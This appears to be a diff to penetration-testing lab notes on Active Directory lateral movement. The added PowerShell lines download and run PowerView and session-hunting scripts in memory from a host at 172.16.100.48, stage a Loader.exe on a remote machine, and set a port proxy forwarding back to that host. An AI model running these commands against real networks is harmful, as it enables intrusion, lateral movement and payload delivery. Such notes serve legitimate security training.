@@ -26,6 +26,10 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 iex(iwr 'http://172.16.100.48/PowerView.ps1' -useb)
 iex(iwr 'http://172.16.100.48/Invoke-SessionHunter.ps1' -useb)
 iex(iwr 'http://172.16.100.48/Find-PSRemotingLocalAdminAccess.ps1' -useb)
+
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/Find-PSRemotingLocalAdminAccess.ps1'))
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/Invoke-SessionHunter.ps1'))
 ```
 
 You must have administrator access to list sessions - netexec equivalent
@@ -40,6 +44,8 @@ $null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
 ### Lateral 1 (Local Admin)
 Add port forward to machine to forwards to webserver - downloading executable is bad
 ```powershell
+iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe
+
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
